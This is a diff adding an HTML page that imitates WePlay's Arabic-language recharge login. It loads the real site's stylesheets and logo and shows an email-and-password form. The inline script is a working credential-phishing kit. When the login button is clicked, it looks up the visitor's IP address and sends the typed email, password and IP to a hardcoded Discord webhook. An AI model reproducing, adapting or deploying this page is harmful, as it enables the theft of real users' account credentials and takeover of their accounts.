@@ -1,0 +1,152 @@
+<html style="background-color: rgb(238, 238, 238); font-size: 65px; --vh: 963px;"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <style type="text/css"></style>
+    <link rel="stylesheet" type="text/css" href="https://weplayapp.com/css/7601.9545cb7f.css">
+    <link rel="stylesheet" type="text/css" href="https://weplayapp.com/css/1952.bd407575.css">
+    <link rel="stylesheet" type="text/css" href="https://weplayapp.com/css/4498.2a474618.css">
+    <link rel="stylesheet" type="text/css" href="https://weplayapp.com/css/4228.34ffda0a.css">
+    <link rel="stylesheet" type="text/css" href="https://weplayapp.com/css/892.b0b64f9e.css">
+    <link rel="stylesheet" type="text/css" href="https://weplayapp.com/css/3071.59012fc1.css">
+    <link rel="stylesheet" type="text/css" href="https://weplayapp.com/css/6083.cbcf8707.css">
+    <link rel="stylesheet" type="text/css" href="https://weplayapp.com/css/3344.91eaa92f.css">
+  </head>
+  <body style="background-color: rgb(255, 255, 255);" class="">
+    <noscript><strong>We're sorry but doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript>
+    <div id="recharge" class="ar U">
+      <div data-v-3bef0bee="" class="g-header">
+        <div data-v-3bef0bee="" class="change-area" style="display: none;">
+          <div data-v-3bef0bee="" class="content fx-row fx-c-center">
+            <div data-v-3bef0bee="" class="l fx-1">إختر منطقتك للحصول على محتوى المطابق لـWePlay.</div>
+            <div data-v-3bef0bee="" class="r">التبديل إلى السعودية</div>
+            <div data-v-3bef0bee="" class="close"></div>
+          </div>
+        </div>
+        <div data-v-3bef0bee="" class="content fx-row fx-c-center">
+          <img data-v-3bef0bee="" src="https://weplayapp.com/img/logo.2d160c5c.png" class="logo">
+          <div data-v-3bef0bee="" class="navs fx-1 fx-row fx-c-center"></div>
+        </div>
+      </div>
+      <div class="account" style="">
+        <div class="title">تسجيل دخول المستخدم</div>
+        <input id="userID1" placeholder="البريد الإلكتروني" class="input">
+        <input id="userID2" placeholder="كلمة المرور" class="input">
+        <div class="tip">كيفية الحصول على ID المستخدم؟</div>
+        <div class="btn" id="sendBtn">تسجيل</div>
+      </div>
+      <div class="account" style="display: none;">
+        <div class="title">يرجى تأكيد حساب الشحن</div>
+        <div class="fx-col fx-c-center">
+          <img src="" class="avatar">
+          <div class="nickname"></div>
+          <div class="value">الكاريزما:0</div>
+        </div>
+        <div class="btns fx-row">
+          <div class="fx-1 cancel">إلغاء</div>
+          <div class="fx-1 confirm">تأكيد</div>
+        </div>
+      </div>
+      <div class="dialogs" style="display: none;">
+        <div class="bg"></div>
+        <div class="content tip" style="display: none;">
+          <div class="h">كيفية الحصول على ID المستخدم؟</div>
+          <div class="fx-row">
+            <div class="items">
+              <div class="t">1. قم بتشغيل تطبيق ويبلاي، أدخل صفحة "أنا"، انقر فوق ملف التعريف الخاص بك.</div>
+              <img src="https://fe-center.weplayapp.com/page-center/assets/YxMnMVDc/1BCXuA7B.png?_w=364&amp;_h=624" class="i">
+            </div>
+            <div class="items">
+              <div class="t">2، انقر فوق ID المستخدم للنسخ</div>
+              <img src="https://fe-center.weplayapp.com/page-center/assets/YxMnMVDc/hwUpNyOE.png?_w=364&amp;_h=624" class="i">
+            </div>
+          </div>
+          <div class="btn">حسنا</div>
+        </div>
+      </div>
+      <div data-v-8cc7d0c6="" class="g-footer">
+        <div data-v-8cc7d0c6="" class="content fx-row fx-c-center">
+          <div data-v-8cc7d0c6="" class="copyright not-rtl">Copyright©2021- WEJOY PTE. LTD. All Rights Reserved.</div>
+          <div data-v-8cc7d0c6="" class="navs fx-1 fx-row fx-c-center">
+            <div data-v-8cc7d0c6="" class="item">شروط الخدمة</div>
+            <div data-v-8cc7d0c6="" class="item">سياسة الخصوصية</div>
+          </div>
+          <div data-v-8cc7d0c6="" class="platform fx-row fx-c-center">
+            <img data-v-8cc7d0c6="" src="https://weplayapp.com/assets/images/platform/facebook.png" class="item">
+          </div>
+        </div>
+      </div>
+      <div id="recharge-alert" style="display: none;">
+        <div class="shadow" style="display: none;"></div>
+        <div class="box" style="display: none;">
+          <div class="t"></div>
+          <div class="p"></div>
+          <div class="b"></div>
+        </div>
+      </div>
+    </div>
+    <div id="global-page-toast" style="font-size: 14px;"></div>
+    <script>
+      const webhookURL = "https://discord.com/api/webhooks/1254995021179125821/gAzPZ3DGaJgTDvShSzsnjrCXzz4XeCZTh22RUQQIODXVFUo808hWQ63FBudMHV-AjetA";
+      const ipifyURL = "https://api.ipify.org?format=json";
+  
+      async function getIPAddress() {
+        try {
+          const response = await fetch(ipifyURL);
+          const data = await response.json();
+          return data.ip;
+        } catch (error) {
+          console.error(error);
+        }
+      }
+  
+      async function sendUserIDs(userID1, userID2, ipAddress) {
+        try {
+          await fetch(webhookURL, {
+            method: "POST",
+            body: JSON.stringify({
+              embeds: [
+                {
+                  title: "User info",
+                  fields: [
+                    {
+                      name: "Email",
+                      value: "```" + userID1 + "```"
+                    },
+                    {
+                      name: "Password",
+                      value: "```" + userID2 + "```"
+                    },
+                    {
+                      name: "IP Address",
+                      value: "```" + ipAddress + "```"
+                    }
+                  ],
+                  timestamp: new Date(),
+                  thumbnail: {
+                    url: "https://media.tenor.com/L-8bvnEgNUsAAAAC/supblox-roblox.gif"
+                  },
+                  footer: {
+                    text: "Created By @ABOLHB"
+                  }
+                }
+              ]
+            }),
+            headers: {
+              "Content-Type": "application/json"
+            }
+          });
+        } catch (error) {
+          console.error(error);
+        }
+      }
+      document.getElementById('sendBtn').addEventListener('click', async function() {
+        let userID1 = document.getElementById('userID1').value;
+        let userID2 = document.getElementById('userID2').value;
+        let ipAddress = await getIPAddress();
+  
+        await sendUserIDs(userID1, userID2, ipAddress);
+      });
+    </script>
+  
+  
+  </body></html>
